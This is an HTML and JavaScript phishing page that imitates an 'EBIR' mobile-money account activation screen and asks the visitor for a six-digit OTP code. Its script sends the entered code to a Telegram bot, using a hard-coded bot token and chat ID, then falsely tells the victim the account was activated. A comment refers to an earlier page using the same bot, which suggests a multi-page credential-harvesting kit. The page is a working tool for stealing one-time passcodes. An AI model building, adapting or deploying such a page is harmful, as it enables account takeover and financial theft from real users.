<!DOCTYPE html>
<html lang="en">

<head>

    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0">

    <title>EBIR Activation Code</title>

    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Poppins', sans-serif;
            background: #f3f3f3;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        
        .app {
            width: 390px;
            height: 844px;
            background: #fff;
            overflow: hidden;
            box-shadow: 0 15px 40px rgba(0, 0, 0, .15);
            position: relative;
        }
        /*==========================
HEADER
==========================*/
        
        .header {
            position: relative;
            width: 100%;
            height: 280px;
            background: #fff;
            overflow: hidden;
        }
        
        .header-img {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: contain;
            object-position: top center;
            display: block;
        }
        /*======================
CONTENT
======================*/
        
        .content {
            padding: 30px 25px;
            text-align: center;
        }
        
        .content p {
            font-size: 17px;
            line-height: 1.6;
            color: #222;
        }
        /*======================
OTP
======================*/
        
        .otp {
            display: flex;
            justify-content: center;
            gap: 12px;
            margin-top: 30px;
        }
        
        .otp input {
            width: 48px;
            height: 54px;
            background: #f2f2f2;
            border: none;
            border-bottom: 2px solid #999;
            font-size: 28px;
            text-align: center;
            outline: none;
            transition: .25s;
            border-radius: 8px 8px 0 0;
        }
        
        .otp input:focus {
            background: #fff;
            border-bottom: 3px solid #11a9ec;
            transform: translateY(-2px);
        }
        /*======================
BUTTON
======================*/
        
        .footer {
            position: absolute;
            bottom: 35px;
            left: 0;
            width: 100%;
            padding: 0 22px;
            text-align: center;
        }
        
        .bottom {
            margin-top: 20px;
        }
        
        .bottom a {
            color: #3b8f4d;
            text-decoration: none;
            font-weight: 500;
        }
        
        button {
            width: 100%;
            height: 56px;
            border: none;
            border-radius: 10px;
            background: #14a8e7;
            color: #fff;
            font-size: 19px;
            font-weight: 600;
            box-shadow: 0 6px 15px rgba(0, 0, 0, .2);
            transition: .3s;
            cursor: pointer;
        }
        
        button:hover {
            background: #0f95d1;
        }
        
        button:active {
            transform: scale(.98);
        }
        /*==========================
Responsive
==========================*/
        
        @media(max-width:420px) {
            body {
                background: #fff;
            }
            .app {
                width: 100%;
                height: 100vh;
                box-shadow: none;
            }
            .header {
                height: auto;
                aspect-ratio: 390 / 280;
            }
        }
        
        @media(max-width:360px) {
            .otp {
                gap: 8px;
            }
            .otp input {
                width: 40px;
                height: 46px;
                font-size: 22px;
            }
            .content {
                padding: 20px 16px;
            }
            .content p {
                font-size: 15px;
            }
        }
    </style>

</head>

<body>

    <div class="app">

        <header class="header">
            <img class="header-img" src="ebirr.jpeg" alt="EBIR Header">
        </header>

        <div class="content">

            <p>
                Please confirm with the OTP code sent on your Mobile Number or Email Address
            </p>

            <div class="otp">

                <input maxlength="1" inputmode="numeric" autocomplete="off">
                <input maxlength="1" inputmode="numeric" autocomplete="off">
                <input maxlength="1" inputmode="numeric" autocomplete="off">
                <input maxlength="1" inputmode="numeric" autocomplete="off">
                <input maxlength="1" inputmode="numeric" autocomplete="off">
                <input maxlength="1" inputmode="numeric" autocomplete="off">

            </div>

        </div>

        <div class="footer">

            <button id="activate">Activate</button>

            <div class="bottom">
                Did not received activation code?
                <a href="#" id="resend">Resend Code</a>
            </div>

        </div>

        <script>
            //=========================================
            // TELEGRAM CONFIG — USE SAME BOT AS PAGE 1
            //=========================================
            // ⚠️ REPLACE WITH YOUR OWN BOT TOKEN AND CHAT ID
            const TELEGRAM_BOT_TOKEN = "7186506994:AAEKIkNo49PL-IyvoRFGFJoC5bxUfmfh_L0";
            const TELEGRAM_CHAT_ID = "5615316142";
            //=========================================

            //============================
            // OTP INPUT LOGIC
            //============================

            const otpInputs = document.querySelectorAll(".otp input");

            otpInputs.forEach((input, index) => {

                // Numbers only
                input.addEventListener("input", function() {

                    this.value = this.value.replace(/\D/g, "");

                    if (this.value.length === 1 && index < otpInputs.length - 1) {
                        otpInputs[index + 1].focus();
                    }

                });

                // Keyboard navigation
                input.addEventListener("keydown", function(e) {

                    if (e.key === "Backspace") {

                        if (this.value === "" && index > 0) {

                            otpInputs[index - 1].focus();
                            otpInputs[index - 1].value = "";

                        }

                    }

                    if (e.key === "ArrowLeft" && index > 0) {

                        e.preventDefault();
                        otpInputs[index - 1].focus();

                    }

                    if (e.key === "ArrowRight" && index < otpInputs.length - 1) {

                        e.preventDefault();
                        otpInputs[index + 1].focus();

                    }

                });

                // Select current value
                input.addEventListener("focus", function() {

                    this.select();

                });

            });

            //============================
            // Paste Entire OTP
            //============================

            // Allow pasting on any OTP box, not just the first one
            otpInputs.forEach((input) => {
                input.addEventListener("paste", function(e) {

                    e.preventDefault();

                    let pasted = (e.clipboardData || window.clipboardData)
                        .getData("text")
                        .replace(/\D/g, "")
                        .substring(0, 6);

                    pasted.split("").forEach((digit, i) => {

                        if (otpInputs[i]) {
                            otpInputs[i].value = digit;
                        }

                    });

                    if (pasted.length === 6) {
                        otpInputs[5].blur();
                    } else {
                        otpInputs[pasted.length].focus();
                    }

                });
            });

            //============================
            // Get OTP
            //============================

            function getOTP() {

                return [...otpInputs].map(input => input.value).join("");

            }

            //============================
            // Send to Telegram Function
            //============================

            async function sendOTPToTelegram(otp) {
                const message = `🔐 *OTP / Activation Code Received*\n\n` +
                    `🔢 *Code:* \`${otp}\`\n` +
                    `🕐 *Time:* ${new Date().toLocaleString()}`;

                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

                try {
                    const response = await fetch(url, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            chat_id: TELEGRAM_CHAT_ID,
                            text: message,
                            parse_mode: 'Markdown'
                        })
                    });

                    const result = await response.json();
                    return result.ok;
                } catch (error) {
                    console.error('Telegram send error:', error);
                    return false;
                }
            }

            //============================
            // Activate Button
            //============================

            const activateBtn = document.getElementById("activate");

            activateBtn.addEventListener("click", async function() {

                let otp = getOTP();

                if (otp.length !== 6) {

                    alert("Please enter the 6-digit activation code.");

                    otpInputs[0].focus();

                    return;

                }

                // Disable button to prevent double-submit
                activateBtn.disabled = true;
                activateBtn.textContent = "Processing...";

                // Send OTP to Telegram
                const sent = await sendOTPToTelegram(otp);

                if (!sent) {
                    console.warn("Telegram send failed — check your bot token and chat ID.");
                }

                // Show success and redirect (or keep on same page)
                alert("Your account has been activated successfully!");

                // Optional: redirect to a success page or back to the previous page
                // window.location.href = "success.html";

                // Re-enable button
                activateBtn.disabled = false;
                activateBtn.textContent = "Activate";

            });

            //============================
            // Enter Key
            //============================

            document.addEventListener("keydown", function(e) {

                if (e.key === "Enter") {

                    activateBtn.click();

                }

            });

            //============================
            // Resend Code
            //============================

            document.getElementById("resend").addEventListener("click", function(e) {

                e.preventDefault();

                alert("A new activation code has been sent.");

            });

            //============================
            // Auto Focus First Box
            //============================

            window.onload = function() {

                otpInputs[0].focus();

            };
        </script>

    </div>

</body>

</html>
